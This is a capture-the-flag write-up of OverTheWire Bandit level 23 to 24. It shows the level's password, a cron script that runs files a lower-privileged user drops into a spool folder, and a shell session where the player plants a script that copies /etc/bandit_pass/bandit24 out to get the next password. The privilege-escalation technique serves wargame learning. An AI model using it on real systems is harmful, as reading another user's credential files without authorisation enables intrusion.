# Level 23 al Level 24

## Objetivo 
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel
**bandit.labs.overthewire.org**
cuenta
**bandit23**
passw
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

## Solución 
```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/var/spool/bandit24/foo$ mktemp -d
/tmp/tmp.6PMBX5BriV
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 /tmp/tmp.6PMBX5BriV
bandit23@bandit:/var/spool/bandit24/foo$ cd /tmp/tmp.6PMBX5BriV
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ echo "cat /etc/bandit_pass/bandit24 >/tmp/tmp.6PMBX5BriV/password"  >  scrip
t.sh
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tmp.6PMBX5BriV$ touch password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ chmod 777 password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:34 .
drwxrwx-wt 4025 root     root     11063296 Sep  4 16:35 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:34 password
-rw-rw-r--    1 bandit23 bandit23       61 Sep  4 16:34 script.sh
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ chmod 777 script.sh
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:34 .
drwxrwx-wt 4027 root     root     11063296 Sep  4 16:35 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:34 password
-rwxrwxrwx    1 bandit23 bandit23       61 Sep  4 16:34 script.sh
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ ./script.sh
cat: /etc/bandit_pass/bandit24: Permission denied
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cp script.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.6PMBX5BriV/password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ chmod 777 /var/spool/bandit24/foo
chmod: changing permissions of '/var/spool/bandit24/foo': Operation not permitted
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ chmod 777 /tmp/tmp.6PMBX5BriV
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.6PMBX5BriV/password
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.6PMBX5BriV$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

```

## Notas adicionales

## Referencias 
